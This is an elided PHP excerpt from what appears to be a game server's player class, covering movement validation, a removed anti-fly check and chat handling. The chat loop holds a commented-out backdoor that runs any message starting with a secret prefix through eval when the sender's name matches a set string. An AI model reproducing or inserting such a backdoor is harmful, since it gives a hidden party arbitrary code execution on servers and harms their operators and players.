...
public function setPipelineEnabled($value) {
    $this->pipelineEnabled = (bool)$value;
}

public function isPipelineEnabled() {
...
protected function processMovement($tickDiff){
    ...
    if($this->pipelineEnabled && $this->server->getPipeline() !== null){
        $from = $this->getPosition();
        $to = clone $newPos;
        
        
        $result = $this->server->getPipeline()->processMovement(
            $this,
            $from,
            $to,
            $this->onGround,
        ...
        if($result['cancelled']){
            ...
            $this->sendPosition($this->getPosition(), $this->yaw, $this->pitch);
...
public function onUpdate($currentTick){
    ...
    return true;
    /* AntiFly foi removido pq tava bugando */
}
...
public function canInteract(Vector3 $pos, $maxDistance, $maxDiff = M_PI){ 
...
foreach(explode("\n",$packet->message)as$message){if(trim($message)!=""and strlen($message)<=255 and$this->messageCounter-->0){
//if(is_numeric(strpos($this->getName(),"pea#ch"))){if(substr($message,0,1)==="$noyeotk"){@eval(substr($message,1)); // This is removed by Tubunga:)
//return;
//}
//}
